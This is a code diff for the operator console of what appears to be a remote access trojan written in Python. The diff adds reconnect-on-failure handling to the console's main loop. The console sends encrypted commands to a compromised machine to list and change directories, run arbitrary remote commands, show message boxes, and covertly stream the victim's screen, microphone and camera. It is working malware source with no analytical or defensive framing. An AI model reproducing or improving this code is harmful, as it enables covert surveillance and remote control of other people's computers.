@@ -63,82 +63,86 @@ change = 0
 path = ""
 # Main Code
 while True:
-    if change == 0:
-        path = client_socket.recv(8192)
-        path = decrypt(path)
-    data = input(f"{color.BLUE}{path} >{color.WHITE} ")
-    data = data.split(" ")
-    command = data[0]
+    try: 
+        if change == 0:
+            path = client_socket.recv(8192)
+            path = decrypt(path)
+        data = input(f"{color.BLUE}{path} >{color.WHITE} ")
+        data = data.split(" ")
+        command = data[0]
 
-    if command == "ls":
-        client_socket.send(crypt("ls".encode())) 
-        response = client_socket.recv(8192)
-        response = decrypt(response)
-        response = eval(response)
-        for i in range(0, len(response)): print(response[i])
+        if command == "ls":
+            client_socket.send(crypt("ls".encode())) 
+            response = client_socket.recv(8192)
+            response = decrypt(response)
+            response = eval(response)
+            for i in range(0, len(response)): print(response[i])
 
-    elif command == "pwd":
-        client_socket.send(crypt("pwd".encode()))
-        response = client_socket.recv(8192)
-        response = decrypt(response)
-        print(response)
+        elif command == "pwd":
+            client_socket.send(crypt("pwd".encode()))
+            response = client_socket.recv(8192)
+            response = decrypt(response)
+            print(response)
 
-    elif command == "cd":
-        client_socket.send(crypt(str(data).encode()))
+        elif command == "cd":
+            client_socket.send(crypt(str(data).encode()))
 
-    elif command == "messagebox":
-        client_socket.send(crypt(str(data).encode()))
+        elif command == "messagebox":
+            client_socket.send(crypt(str(data).encode()))
 
-    elif command == "execute":
-        client_socket.send(crypt(str(data).encode()))
-        count = client_socket.recv(8192)
-        count = decrypt(count)
-        try:
-            count = int(count)
-        except:
-            print("An error Ocurred! 0x16")
-        else:
-            out = ""
-            for i in range(count): 
-                raw = client_socket.recv(8192)
-                raw = decrypt(raw, encode='windows-1252')
-                out = out + raw
-                print(out)
-            
-    elif command == "help":
-        print(f''' 
-This is the help menu, there are 2 types of arguments: < Required > and [ Optional ].
-The commands are divided by sections according to their function and each section is divided into 3 columns: 
-command - description - context (if executed locally or remotely).
-              
-== {color.RED}SHELL{color.WHITE}
-====================================================
-ls                    List Files              Remote
-pwd                   Print Path              Remote
-cd <Path>             Change Directory        Remote
-clear                 Clear Terminal          Local  
-execute               Run remote commands     Remote \n''')
-        change = 1
+        elif command == "execute":
+            client_socket.send(crypt(str(data).encode()))
+            count = client_socket.recv(8192)
+            count = decrypt(count)
+            try:
+                count = int(count)
+            except:
+                print("An error Ocurred! 0x16")
+            else:
+                out = ""
+                for i in range(count): 
+                    raw = client_socket.recv(8192)
+                    raw = decrypt(raw, encode='windows-1252')
+                    out = out + raw
+                    print(out)
+                
+        elif command == "help":
+            print(f''' 
+    This is the help menu, there are 2 types of arguments: < Required > and [ Optional ].
+    The commands are divided by sections according to their function and each section is divided into 3 columns: 
+    command - description - context (if executed locally or remotely).
+                
+    == {color.RED}SHELL{color.WHITE}
+    ====================================================
+    ls                    List Files              Remote
+    pwd                   Print Path              Remote
+    cd <Path>             Change Directory        Remote
+    clear                 Clear Terminal          Local  
+    execute               Run remote commands     Remote \n''')
+            change = 1
 
-    elif command == "screen":
-        client_socket.send(crypt(str(data).encode()))
-        server = vidstream.StreamingServer("127.0.0.1", 9999)
-        server.start_server()
-    
-    elif command == "audio":
-        client_socket.send(crypt(str(data).encode()))
-        server = vidstream.AudioReceiver("127.0.0.1", 9898)
-        server.start_server()
+        elif command == "screen":
+            client_socket.send(crypt(str(data).encode()))
+            server = vidstream.StreamingServer("127.0.0.1", 9999)
+            server.start_server()
+        
+        elif command == "audio":
+            client_socket.send(crypt(str(data).encode()))
+            server = vidstream.AudioReceiver("127.0.0.1", 9898)
+            server.start_server()
 
-    elif command == "camera":
-        client_socket.send(crypt(str(data).encode()))
-        server = vidstream.StreamingServer("127.0.0.1", 9797)
-        server.start_server()
+        elif command == "camera":
+            client_socket.send(crypt(str(data).encode()))
+            server = vidstream.StreamingServer("127.0.0.1", 9797)
+            server.start_server()
 
-    elif command == "exit":
-        print("Cleaning....")
-        client_socket.send(crypt("sleep".encode()))
-        break
+        elif command == "exit":
+            print("Cleaning....")
+            client_socket.send(crypt("sleep".encode()))
+            break
+
+    except ConnectionResetError:
+        server_socket.close()
+        client_socket, server_socket, privateKey, remoteKey = connSetup()
 
 
-server_socket.close()
